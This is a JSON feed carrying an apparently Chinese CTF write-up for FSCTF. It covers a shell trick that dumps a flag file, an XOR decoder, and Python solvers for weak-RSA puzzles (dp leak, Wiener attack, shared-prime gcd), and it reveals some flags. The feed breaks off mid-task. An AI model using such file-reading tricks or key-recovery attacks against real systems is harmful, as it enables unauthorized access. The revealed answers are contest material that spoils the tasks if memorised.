{
    "version": "https://jsonfeed.org/version/1",
    "title": "null • All posts by \"wp\" tag",
    "description": "欢迎来到Huan的笔记空间~这里主要会记录pwn笔记🌸",
    "home_page_url": "http://example.com",
    "items": [
        {
            "id": "http://example.com/2023/10/24/FSCTF-wp/",
            "url": "http://example.com/2023/10/24/FSCTF-wp/",
            "title": "FSCTF_wp",
            "date_published": "2023-10-24T01:31:05.000Z",
            "content_html": "<h1 id=\"fsctf\"><a class=\"markdownIt-Anchor\" href=\"#fsctf\">#</a> FSCTF</h1>\n<p>RAND:12</p>\n<p><img data-src=\"%5Cimg%5Cfsctfwppic%5Cimage-20231024075145656.png\" alt=\"image-20231024075145656\"></p>\n<h2 id=\"web\"><a class=\"markdownIt-Anchor\" href=\"#web\">#</a> web</h2>\n<h3 id=\"源码启动\"><a class=\"markdownIt-Anchor\" href=\"#源码启动\">#</a> 源码！启动！</h3>\n<p>CTRL+U 查看源码</p>\n<h2 id=\"pwn\"><a class=\"markdownIt-Anchor\" href=\"#pwn\">#</a> pwn</h2>\n<h3 id=\"nc\"><a class=\"markdownIt-Anchor\" href=\"#nc\">#</a> nc</h3>\n<pre><code>tac fl* &gt;&amp;2\n</code></pre>\n<h2 id=\"re\"><a class=\"markdownIt-Anchor\" href=\"#re\">#</a> re</h2>\n<h3 id=\"xor\"><a class=\"markdownIt-Anchor\" href=\"#xor\">#</a> Xor</h3>\n<figure class=\"highlight python\"><figcaption data-lang=\"python\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre>b <span class=\"token operator\">=</span> <span class=\"token builtin\">list</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"t~suiFz&#123;aM&#123;aMsMwsakM`wdw`awo\"</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token keyword\">for</span> i <span class=\"token keyword\">in</span> <span class=\"token builtin\">range</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">len</span><span class=\"token punctuation\">(</span>b<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre>    b<span class=\"token punctuation\">[</span>i<span class=\"token punctuation\">]</span> <span class=\"token operator\">=</span> <span class=\"token builtin\">chr</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">ord</span><span class=\"token punctuation\">(</span>b<span class=\"token punctuation\">[</span>i<span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">^</span> <span class=\"token number\">0x12</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre><span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token string\">''</span><span class=\"token punctuation\">.</span>join<span class=\"token punctuation\">(</span>b<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr></table></figure><h2 id=\"crypto\"><a class=\"markdownIt-Anchor\" href=\"#crypto\">#</a> crypto</h2>\n<h3 id=\"rsa-1\"><a class=\"markdownIt-Anchor\" href=\"#rsa-1\">#</a> RSA 1</h3>\n<pre><code>p=1458769258361\nq=4556983871563\ne=17\n求d\n</code></pre>\n<figure class=\"highlight python\"><figcaption data-lang=\"python\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token keyword\">import</span> gmpy2</pre></td></tr><tr><td data-num=\"2\"></td><td><pre>phi <span class=\"token operator\">=</span> <span class=\"token punctuation\">(</span>p<span class=\"token operator\">-</span><span class=\"token number\">1</span><span class=\"token punctuation\">)</span><span class=\"token operator\">*</span><span class=\"token punctuation\">(</span>q<span class=\"token operator\">-</span><span class=\"token number\">1</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre>d <span class=\"token operator\">=</span> gmpy2<span class=\"token punctuation\">.</span>invert<span class=\"token punctuation\">(</span>e<span class=\"token punctuation\">,</span>phi<span class=\"token punctuation\">)</span></pre></td></tr></table></figure><h3 id=\"做不出来就别阴阳怪气啦\"><a class=\"markdownIt-Anchor\" href=\"#做不出来就别阴阳怪气啦\">#</a> 做不出来就别阴阳怪气啦</h3>\n<pre><code>就 这 ¿ 就 这 ¿ 不 会 吧 ？ 就 这 ¿ 就 这 ¿ 就 这 ¿ 不 会 吧 ？ 不 会 吧 ？ 就 这 ¿ 就 这 ¿ 就 这 ¿ 不 会 吧 ？ 就 这 ¿ 不 会 吧 ？ 就 这 ¿ 就 这 ¿ 不 会 吧 ？ 不 会 吧 ？ 就 这 ¿ 就 这 ¿ 不 会 吧 ？ 就 这 ¿ 就 这 ¿ 就 这 ¿ 就 这 ¿ 不 会 吧 ？ 不 会 吧 ？ 就 这 ¿ 就 这 ¿ 不 会 吧 ？ 就 这 ¿ 不 会 吧 ？ 就 这 ¿ 不 会 吧 ？ 就 这 ¿ 就 这 ¿ 就 这 ¿ 就 这 ¿ 不 会 吧 ？ 就 这 ¿ 就 这 ¿ 就 这 ¿ 不 会 吧 ？ 不 会 吧 ？ 就 这 ¿ 就 这 ¿ 就 这 ¿ 不 会 吧 ？ 不 会 吧 ？ 不 会 吧 ？ 不 会 吧 ？ 就 这 ¿ 不 会 吧 ？ 不 会 吧 ？ 就 这 ¿ 就 这 ¿ 不 会 吧 ？ 就 这 ¿ 就 这 ¿ 不 会 吧 ？ 就 这 ¿ 不 会 吧 ？ 就 这 ¿ 就 这 ¿ 就 这 ¿ 不 会 吧 ？ 不 会 吧 ？ 就 这 ¿ 不 会 吧 ？ 就 这 ¿ 就 这 ¿ 不 会 吧 ？ 就 这 ¿ 就 这 ¿ 不 会 吧 ？ 不 会 吧 ？ 不 会 吧 ？ 就 这 ¿ 不 会 吧 ？ 就 这 ¿ 不 会 吧 ？ 就 这 ¿ 就 这 ¿ 不 会 吧 ？ 不 会 吧 ？ 不 会 吧 ？ 不 会 吧 ？ 就 这 ¿ 不 会 吧 ？ 就 这 ¿ 就 这 ¿ 就 这 ¿ 不 会 吧 ？ 不 会 吧 ？ 就 这 ¿ 不 会 吧 ？ 就 这 ¿ 就 这 ¿ 就 这 ¿ 就 这 ¿ 就 这 ¿ 不 会 吧 ？ 不 会 吧 ？ 就 这 ¿ 就 这 ¿ 不 会 吧 ？ 就 这 ¿ 不 会 吧 ？ 就 这 ¿ 就 这 ¿ 不 会 吧 ？ 就 这 ¿ 就 这 ¿ 就 这 ¿ 就 这 ¿ 就 这 ¿ 就 这 ¿ 就 这 ¿ 就 这 ¿ 不 会 吧 ？ 就 这 ¿ 就 这 ¿ 不 会 吧 ？ 就 这 ¿ 不 会 吧 ？ 就 这 ¿ 就 这 ¿ 就 这 ¿ 不 会 吧 ？ 不 会 吧 ？ 不 会 吧 ？ 就 这 ¿ 不 会 吧 ？ 就 这 ¿ 不 会 吧 ？ 就 这 ¿ 就 这 ¿ 不 会 吧 ？ 不 会 吧 ？ 不 会 吧 ？ 就 这 ¿ 就 这 ¿ 不 会 吧 ？ 不 会 吧 ？ 就 这 ¿ 就 这 ¿ 不 会 吧 ？ 不 会 吧 ？ 不 会 吧 ？ 就 这 ¿ 不 会 吧 ？ 就 这 ¿ 就 这 ¿ 就 这 ¿ 就 这 ¿ 不 会 吧 ？ 就 这 ¿ 不 会 吧 ？ 就 这 ¿ 就 这 ¿ 不 会 吧 ？ 不 会 吧 ？ 就 这 ¿ 就 这 ¿ 不 会 吧 ？ 不 会 吧 ？ 就 这 ¿ 不 会 吧 ？ 不 会 吧 ？ 不 会 吧 ？ 不 会 吧 ？ 就 这 ¿ 就 这 ¿ 不 会 吧 ？ 就 这 ¿ 不 会 吧 ？ 就 这 ¿ 就 这 ¿ 不 会 吧 ？ 不 会 吧 ？ 就 这 ¿ 就 这 ¿ 不 会 吧 ？ 不 会 吧 ？ 就 这 ¿ 不 会 吧 ？ 不 会 吧 ？ 不 会 吧 ？ 不 会 吧 ？ 就 这 ¿ 就 这 ¿ 不 会 吧 ？ 不 会 吧 ？ 不 会 吧 ？ 不 会 吧 ？ 不 会 吧 ？ 就 这 ¿ 不 会 吧 ？ \n</code></pre>\n<blockquote>\n<p>阴阳怪气解密</p>\n</blockquote>\n<pre><code>FSCTF&#123;Jiuzhe@JustSoSo&#125;\n</code></pre>\n<h3 id=\"rsa-2\"><a class=\"markdownIt-Anchor\" href=\"#rsa-2\">#</a> RSA 2</h3>\n<pre><code>c=90362297576572826064831133206230135349790392078780406000643496612200873754835039374184323808342127071833274981191134125413478105835272238356352724573228797863805124195170088819735610736936895478614898105848968069280022022112207095140266709372221090586917729998024205978412679448008696923580889787529663283314\np=8637633767257008567099653486541091171320491509433615447539162437911244175885667806398411790524083553445158113502227745206205327690939504032994699902053229 \nq=11874843837980297032092405848653656852760910154543380907650040190704283358909208578251063047732443992230647903887510065547947313543299303261986053486569407\ne=65537\n</code></pre>\n<figure class=\"highlight python\"><figcaption data-lang=\"python\"><span>n</span></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token keyword\">import</span> libnum</pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token keyword\">import</span> gmpy2</pre></td></tr><tr><td data-num=\"3\"></td><td><pre>phi <span class=\"token operator\">=</span> <span class=\"token punctuation\">(</span>p<span class=\"token operator\">-</span><span class=\"token number\">1</span><span class=\"token punctuation\">)</span><span class=\"token operator\">*</span><span class=\"token punctuation\">(</span>q<span class=\"token operator\">-</span><span class=\"token number\">1</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre>d <span class=\"token operator\">=</span> gmpy2<span class=\"token punctuation\">.</span>invert<span class=\"token punctuation\">(</span>e<span class=\"token punctuation\">,</span>phi<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre>m <span class=\"token operator\">=</span> <span class=\"token builtin\">pow</span><span class=\"token punctuation\">(</span>c<span class=\"token punctuation\">,</span> d<span class=\"token punctuation\">,</span> n<span class=\"token punctuation\">)</span></pre></td></tr></table></figure><h3 id=\"rsa3\"><a class=\"markdownIt-Anchor\" href=\"#rsa3\">#</a> RSA3</h3>\n<figure class=\"highlight python\"><figcaption data-lang=\"python\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token keyword\">from</span> Crypto<span class=\"token punctuation\">.</span>Util<span class=\"token punctuation\">.</span>number <span class=\"token keyword\">import</span> bytes_to_long</pre></td></tr><tr><td data-num=\"2\"></td><td><pre>m<span class=\"token operator\">=</span>bytes_to_long<span class=\"token punctuation\">(</span>flag<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre>n<span class=\"token operator\">=</span> <span class=\"token number\">12308543373374311860115195114269947739026255098864232126071500623399852788903738569949462616714391748269539072128882946132686996592089735285396762634029371785959865779256901123369306119124563405765293657606975290441243965513640680841871955014230301486214824204887945375140818283280272607903500556306646445508386218951500563603482945071727344737690804338144982687000734071274618240408238519378280819162796749148066754028700125846348589164721591354555019608871411236973606149388257533629388508942271702742078883636357856776193846813894734271905070538713351614750057245897158615891962167410053552739441195871000310777649</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre>e<span class=\"token operator\">=</span> <span class=\"token number\">65537</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre>dp<span class=\"token operator\">=</span> <span class=\"token number\">28196759050232165736649945458463681080421101473761579424309687746007021074159564720195299959516638110870101025657932732247788828322476803386736345945717104030991724584628153257976163663460034720811420324255626233108130037584679035250792445830510130682783638394418531763109219293027733347554816808577799709553</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre>c<span class=\"token operator\">=</span> <span class=\"token number\">1855798257044238280327042455832785889763141234883180404158555071443088630113034033050409259513632343742665544043437830959750873431928980910236398026670945184328950692568113819821699696418438157336263799808404698795433243968536256780396910914692949484556950491722527661706255009863481905590371725089587377065000354109396062360440021447607401687082247775453369117424848927386857425051097931983703966253652921113920387008048024308793686643944404541941182997963873579988680965558581885273185721576668001462817150245955628293258512024323515581063235248627223179117549540541642185815489978089367061102920114395871329023208</span></pre></td></tr></table></figure><blockquote>\n<p>dp 泄露</p>\n</blockquote>\n<p><img data-src=\"%5Cimg%5Cfsctfwppic%5Cimage-20231024081420584.png\" alt=\"image-20231024081420584\"></p>\n<h3 id=\"big_e\"><a class=\"markdownIt-Anchor\" href=\"#big_e\">#</a> Big_e</h3>\n<pre><code>n = 12238605063252292170613110607692779326628090745751955692266649177882959231822580682548279800443278979485092243645806337103841086023159482786712759291169541633901936290854044069486201989034158882661270017305064348254800318759062921744741432214818915527537124001063995865927527037625277330117588414586505635959411443039463168463608235165929831344586283875119363703480280602514451713723663297066810128769907278246434745483846869482536367912810637275405943566734099622063142293421936734750356828712268385319217225803602442033960930413469179550331907541244416573641309943913383658451409219852933526106735587605884499707827\ne=  11850552481503020257392808424743510851763548184936536180317707155841959788151862976445957810691568475609821000653594584717037528429828330763571556164988619635320288125983463358648887090031957900011546300841211712664477474767941406651977784177969001025954167441377912326806132232375497798238928464025466905201977180541053129691501120197010080001677260814313906843670652972019631997467352264392296894192998971542816081534808106792758008676039929763345402657578681818891775091140555977382868531202964486261123748663752490909455324860302967636149379567988941803701512680099398021640317868259975961261408500449965277690517\nc=4218884541887711839568615416673923480889604461874475071333225389075770098726337046768413570546617180777109293884545400260353306419150066928226964662256930702466709992997796154415790565112167663547017839870351167884417142819504498662037048412313768450136617389372395690363188005647619061128497371121168347810294424378348301835826084732747005110258557662466626720961279087145559906371505117097599774430970980355531235913439823966628008554872896820907555353892843539526041019103819804854883231421963308265517622470779089941078841902464033685762524196275032288319744157255628189204988632871276637699312750636348750883054\n\n\n请解出明文！！！\n</code></pre>\n<blockquote>\n<p>维纳攻击</p>\n</blockquote>\n<p><img data-src=\"%5Cimg%5Cfsctfwppic%5Cimage-20231024081609249.png\" alt=\"image-20231024081609249\"></p>\n<h3 id=\"do-you-know-gcd\"><a class=\"markdownIt-Anchor\" href=\"#do-you-know-gcd\">#</a> Do you know gcd</h3>\n<figure class=\"highlight python\"><figcaption data-lang=\"python\"><span>n</span></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token keyword\">from</span> Crypto<span class=\"token punctuation\">.</span>Util<span class=\"token punctuation\">.</span>number <span class=\"token keyword\">import</span> <span class=\"token operator\">*</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token keyword\">from</span> secret <span class=\"token keyword\">import</span> flag</pre></td></tr><tr><td data-num=\"3\"></td><td><pre></pre></td></tr><tr><td data-num=\"4\"></td><td><pre>m1<span class=\"token operator\">=</span>bytes_to_long<span class=\"token punctuation\">(</span>flag<span class=\"token punctuation\">[</span><span class=\"token punctuation\">:</span><span class=\"token number\">16</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre>m2<span class=\"token operator\">=</span>bytes_to_long<span class=\"token punctuation\">(</span>flag<span class=\"token punctuation\">[</span><span class=\"token number\">16</span><span class=\"token punctuation\">:</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre>p<span class=\"token operator\">=</span>getPrime<span class=\"token punctuation\">(</span><span class=\"token number\">1024</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre>q1<span class=\"token operator\">=</span>getPrime<span class=\"token punctuation\">(</span><span class=\"token number\">1024</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre>q2<span class=\"token operator\">=</span>getPrime<span class=\"token punctuation\">(</span><span class=\"token number\">1024</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre>n1<span class=\"token operator\">=</span>p<span class=\"token operator\">*</span>q1</pre></td></tr><tr><td data-num=\"10\"></td><td><pre>n2<span class=\"token operator\">=</span>p<span class=\"token operator\">*</span>q2</pre></td></tr><tr><td data-num=\"11\"></td><td><pre>e<span class=\"token operator\">=</span><span class=\"token number\">65537</span></pre></td></tr><tr><td data-num=\"12\"></td><td><pre>c1<span class=\"token operator\">=</span><span class=\"token builtin\">pow</span><span class=\"token punctuation\">(</span>m1<span class=\"token punctuation\">,</span>e<span class=\"token punctuation\">,</span>n1<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"13\"></td><td><pre>c2<span class=\"token operator\">=</span><span class=\"token builtin\">pow</span><span class=\"token punctuation\">(</span>m2<span class=\"token punctuation\">,</span>e<span class=\"token punctuation\">,</span>n2<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"14\"></td><td><pre><span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"n1=\"</span><span class=\"token punctuation\">,</span>n1<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"15\"></td><td><pre><span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"n2=\"</span><span class=\"token punctuation\">,</span>n2<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"16\"></td><td><pre><span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"c1=\"</span><span class=\"token punctuation\">,</span>c1<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"17\"></td><td><pre><span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"c2=\"</span><span class=\"token punctuation\">,</span>c2<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"18\"></td><td><pre><span class=\"token triple-quoted-string string\">'''</pre></td></tr><tr><td data-num=\"19\"></td><td><pre>n1= 18680935400842120133090782991548100098299141114788036098274292600814484762178879421175852824971602717084073867867453382415307589970440719890918576225495401632854107018246844209327118177917122236073227158593514362850629722223228335334773008682775987859295083444638923726449899310854161394586430943134469559429878238769266114132469166535509030877235272476877484918308883799496627699789051809542538091061550107526246728583019140703765888157806778516567048103700384849598143249322109207879381251223776896702362630437178664824125387477797876186939235800859102380783259361745143574493440078787931593394188675093506492640857</pre></td></tr><tr><td data-num=\"20\"></td><td><pre>n2= 16308523133405725830120564525574438512803584148781960516042054284309437381876822602134185065101371986717984978566359252072738078020261823966208153922611063201149105749778596739692554295573408850719208215646167050188830459343054219856901871953140988948482577813730729085764541988120049026971705499798003225755018687242522370406495429425494022876627543617474873929054728724093702291448754458748923218635900061398716191201846139296921753782690468189409101899415028480878296408735247604084627019116374444335509072590669239349212479592499426230525792270750612371117196200786891891430446212938482959351978202358044864822577</pre></td></tr><tr><td data-num=\"21\"></td><td><pre>c1= 534518909595318304521410713148076850830155521838755402438490325620155197496935820831936109252194297244161393310730073882257949954815312409974998733265641354273665213856408848764503848122264972023143474923678585167025591255034150826271791019266426616987355463111138963331008761826310757292765842789380409826387579098421126952331558360737102888876551724241978020305977032047901621477384392409864427091911872691182528938458750707982564581322551517287491916691010743390992018974168703956622998928457142606354825714033609199676987795174032254878017883605565760275857658822315970522114838062469258676628619381342357632179</pre></td></tr><tr><td data-num=\"22\"></td><td><pre>c2= 10248394002302905069278122013496854496130190499518622376819239887579692634750808499513497018453473232140518824608976734237637842228035017757831938865937098325684711995382081489403971465596662585196007547659143066184546400992333479193424580690897692586491475768279754939199148642035267049092880715299621206567123356521609120801306358100326600900326310677054810032471472266402660807205675696110133573150125117412696328434523507708110949743705536889950671778501402435457354251761692098671783596194430798692942013503015764266392551048702428063161786512924608239609802040937400619384828550050291094616346317726139970219621</pre></td></tr><tr><td data-num=\"23\"></td><td><pre>'''</span></pre></td></tr></table></figure><figure class=\"highlight python\"><figcaption data-lang=\"python\"><span>n</span></figcaption><table><tr><td data-num=\"1\"></td><td><pre>n1<span class=\"token operator\">=</span> <span class=\"token number\">18680935400842120133090782991548100098299141114788036098274292600814484762178879421175852824971602717084073867867453382415307589970440719890918576225495401632854107018246844209327118177917122236073227158593514362850629722223228335334773008682775987859295083444638923726449899310854161394586430943134469559429878238769266114132469166535509030877235272476877484918308883799496627699789051809542538091061550107526246728583019140703765888157806778516567048103700384849598143249322109207879381251223776896702362630437178664824125387477797876186939235800859102380783259361745143574493440078787931593394188675093506492640857</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre>n2<span class=\"token operator\">=</span> <span class=\"token number\">16308523133405725830120564525574438512803584148781960516042054284309437381876822602134185065101371986717984978566359252072738078020261823966208153922611063201149105749778596739692554295573408850719208215646167050188830459343054219856901871953140988948482577813730729085764541988120049026971705499798003225755018687242522370406495429425494022876627543617474873929054728724093702291448754458748923218635900061398716191201846139296921753782690468189409101899415028480878296408735247604084627019116374444335509072590669239349212479592499426230525792270750612371117196200786891891430446212938482959351978202358044864822577</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre>c1<span class=\"token operator\">=</span> <span class=\"token number\">534518909595318304521410713148076850830155521838755402438490325620155197496935820831936109252194297244161393310730073882257949954815312409974998733265641354273665213856408848764503848122264972023143474923678585167025591255034150826271791019266426616987355463111138963331008761826310757292765842789380409826387579098421126952331558360737102888876551724241978020305977032047901621477384392409864427091911872691182528938458750707982564581322551517287491916691010743390992018974168703956622998928457142606354825714033609199676987795174032254878017883605565760275857658822315970522114838062469258676628619381342357632179</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre>c2<span class=\"token operator\">=</span> <span class=\"token number\">10248394002302905069278122013496854496130190499518622376819239887579692634750808499513497018453473232140518824608976734237637842228035017757831938865937098325684711995382081489403971465596662585196007547659143066184546400992333479193424580690897692586491475768279754939199148642035267049092880715299621206567123356521609120801306358100326600900326310677054810032471472266402660807205675696110133573150125117412696328434523507708110949743705536889950671778501402435457354251761692098671783596194430798692942013503015764266392551048702428063161786512924608239609802040937400619384828550050291094616346317726139970219621</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre>e<span class=\"token operator\">=</span><span class=\"token number\">65537</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre>p <span class=\"token operator\">=</span> gcd<span class=\"token punctuation\">(</span>n1<span class=\"token punctuation\">,</span>n2<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre><span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span>p<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre>q1 <span class=\"token operator\">=</span> n1<span class=\"token operator\">//</span>p</pre></td></tr><tr><td data-num=\"9\"></td><td><pre>q2 <span class=\"token operator\">=</span> n2<span class=\"token operator\">//</span>p</pre></td></tr><tr><td data-num=\"10\"></td><td><pre></pre></td></tr><tr><td data-num=\"11\"></td><td><pre>phi1<span class=\"token operator\">=</span><span class=\"token punctuation\">(</span>p<span class=\"token operator\">-</span><span class=\"token number\">1</span><span class=\"token punctuation\">)</span><span class=\"token operator\">*</span><span class=\"token punctuation\">(</span>q1<span class=\"token operator\">-</span><span class=\"token number\">1</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"12\"></td><td><pre>phi2<span class=\"token operator\">=</span><span class=\"token punctuation\">(</span>p<span class=\"token operator\">-</span><span class=\"token number\">1</span><span class=\"token punctuation\">)</span><span class=\"token operator\">*</span><span class=\"token punctuation\">(</span>q2<span class=\"token operator\">-</span><span class=\"token number\">1</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"13\"></td><td><pre></pre></td></tr><tr><td data-num=\"14\"></td><td><pre>d1<span class=\"token operator\">=</span>gmpy2<span class=\"token punctuation\">.</span>invert<span class=\"token punctuation\">(</span>e<span class=\"token punctuation\">,</span>phi1<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"15\"></td><td><pre>d2<span class=\"token operator\">=</span>gmpy2<span class=\"token punctuation\">.</span>invert<span class=\"token punctuation\">(</span>e<span class=\"token punctuation\">,</span>phi2<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"16\"></td><td><pre></pre></td></tr><tr><td data-num=\"17\"></td><td><pre><span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span>long_to_bytes<span class=\"token punctuation\">(</span><span class=\"token builtin\">pow</span><span class=\"token punctuation\">(</span>c1<span class=\"token punctuation\">,</span>d1<span class=\"token punctuation\">,</span>n1<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">+</span> long_to_bytes<span class=\"token punctuation\">(</span><span class=\"token builtin\">pow</span><span class=\"token punctuation\">(</span>c2<span class=\"token punctuation\">,</span>d2<span class=\"token punctuation\">,</span>n2<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr></table></figure><h3 id=\"埃塞克的秘密\"><a class=\"markdownIt-Anchor\" href=\"#埃塞克的秘密\">#</a> 埃塞克的秘密</h3>\n<pre><code>埃塞克先生将自己的秘密藏在盒子里并交给了ROT保管，埃塞克先生在盒子上留下了这样一串数字：\n117 36 114 37 117 76 37 57 111 63 60 48 74 64 70 78\n</code></pre>\n<p>转 ascii 码后，ROT47</p>\n<pre><code>FSCTF&#123;Th@nk_you&#125;\n</code></pre>\n<h3 id=\"rsa签到\"><a class=\"markdownIt-Anchor\" href=\"#rsa签到\">#</a> RSA 签到</h3>\n<figure class=\"highlight python\"><figcaption data-lang=\"python\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token keyword\">from</span> Crypto<span class=\"token punctuation\">.</span>Util<span class=\"token punctuation\">.</span>number <span class=\"token keyword\">import</span> <span class=\"token operator\">*</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token keyword\">from</span> secret <span class=\"token keyword\">import</span> flag</pre></td></tr><tr><td data-num=\"3\"></td><td><pre>m <span class=\"token operator\">=</span> bytes_to_long<span class=\"token punctuation\">(</span>flag<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre><span class=\"token keyword\">assert</span> m<span class=\"token punctuation\">.</span>bit_length<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token operator\">&lt;</span><span class=\"token number\">150</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre>p <span class=\"token operator\">=</span> getPrime<span class=\"token punctuation\">(</span><span class=\"token number\">512</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre>q <span class=\"token operator\">=</span> getPrime<span class=\"token punctuation\">(</span><span class=\"token number\">512</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre>n <span class=\"token operator\">=</span> p<span class=\"token operator\">*</span>q</pre></td></tr><tr><td data-num=\"8\"></td><td><pre>e <span class=\"token operator\">=</span> <span class=\"token number\">3</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre>c <span class=\"token operator\">=</span> <span class=\"token builtin\">pow</span><span class=\"token punctuation\">(</span>m<span class=\"token punctuation\">,</span> e<span class=\"token punctuation\">,</span> n<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre>kbits <span class=\"token operator\">=</span> <span class=\"token number\">103</span></pre></td></tr><tr><td data-num=\"11\"></td><td><pre>m <span class=\"token operator\">=</span> <span class=\"token punctuation\">(</span>m <span class=\"token operator\">>></span> kbits<span class=\"token punctuation\">)</span> <span class=\"token operator\">&lt;&lt;</span> kbits</pre></td></tr><tr><td data-num=\"12\"></td><td><pre>Mod <span class=\"token operator\">=</span> getPrime<span class=\"token punctuation\">(</span><span class=\"token number\">2048</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"13\"></td><td><pre>hint1 <span class=\"token operator\">=</span> <span class=\"token punctuation\">(</span><span class=\"token number\">2019</span><span class=\"token operator\">-</span><span class=\"token number\">2023</span><span class=\"token operator\">*</span>m<span class=\"token punctuation\">)</span> <span class=\"token operator\">%</span> Mod</pre></td></tr><tr><td data-num=\"14\"></td><td><pre>hint2 <span class=\"token operator\">=</span> <span class=\"token builtin\">pow</span><span class=\"token punctuation\">(</span><span class=\"token number\">2</span><span class=\"token punctuation\">,</span> <span class=\"token number\">2023</span><span class=\"token punctuation\">,</span> Mod<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"15\"></td><td><pre><span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token string\">'n ='</span><span class=\"token punctuation\">,</span>n<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"16\"></td><td><pre><span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token string\">'c ='</span><span class=\"token punctuation\">,</span>c<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"17\"></td><td><pre><span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token string\">'hint1 ='</span><span class=\"token punctuation\">,</span>hint1<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"18\"></td><td><pre><span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token string\">'hint2 ='</span><span class=\"token punctuation\">,</span>hint2<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"19\"></td><td><pre><span class=\"token triple-quoted-string string\">'''</pre></td></tr><tr><td data-num=\"20\"></td><td><pre>n = 113369575322962228640839640796005129142256499725384495463316595604047079557930666699058024217561098997292782305151595366764483672240871690818579470888054811186902762990032505953330034837625667158114251720321766235335996441613828302393569643827293040591156144187232255906107532680524431761932215860898533224303</pre></td></tr><tr><td data-num=\"21\"></td><td><pre>c = 42336544435252811021843650684098817755849747192874682997240960601474927692351510022965782272751339319782351146077580929125</pre></td></tr><tr><td data-num=\"22\"></td><td><pre>hint1 = 